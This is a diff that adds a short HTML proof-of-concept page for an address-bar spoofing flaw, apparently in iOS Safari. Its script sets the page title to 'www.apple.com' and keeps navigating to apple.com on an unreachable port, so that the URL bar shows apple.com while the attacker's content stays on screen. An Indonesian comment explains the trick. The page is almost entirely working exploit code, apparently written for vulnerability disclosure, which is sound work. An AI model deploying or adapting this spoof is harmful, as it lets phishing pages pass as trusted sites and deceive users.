@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
+<body style="font-family:-apple-system;padding:40px">
+  <h1>PoC — Address Bar Discrepancy (UMAR ZR)</h1>
+  <p id="s">starting…</p>
+<script>
+function spoof(){
+  document.title = "www.apple.com";
+  document.getElementById('s').textContent =
+    "Content origin: " + location.origin + " — URL bar may read apple.com";
+  // Navigasi ke host:port yang tidak menerima koneksi → iOS tetap tampilkan
+  // domain tujuan (port disembunyikan) selama navigasi pending.
+  window.location.assign("http://www.apple.com:1121");
+  setTimeout(spoof, 4000);
+}
+setTimeout(spoof, 1500);
+</script>
+</body>
+</html>
